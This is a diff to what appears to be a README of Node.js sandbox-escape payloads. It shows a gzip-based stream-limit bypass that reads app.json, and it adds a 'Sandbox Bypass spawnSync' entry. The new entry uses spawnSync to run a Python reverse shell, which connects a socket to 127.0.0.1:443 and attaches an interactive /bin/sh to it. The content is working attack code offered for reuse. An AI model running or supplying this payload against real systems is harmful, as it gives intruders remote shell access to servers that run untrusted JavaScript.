@@ -81,6 +81,19 @@ Bypass stream limits by compressing to gzip (by @aaditya_purani)
 const pwn=require('zlib').createGzip();const inx=require('fs').createReadStream('app.json');const oux = require('fs').createWriteStream('unrestrictive.gz');inx.pipe(pwn).pipe(oux)
 ```
 
+Sandbox Bypass spawnSync (by [netspi](https://t.co/3D9kWREcUz))
+```
+var resp = spawnSync('python',
+['-c',
+'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("127.0.0.1",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+]
+);
+print(resp.stdout);
+print(resp.stderr);
+```
+
 ### Need More ?
 Repository would be mainted time to time. Feel free to contribute.
 
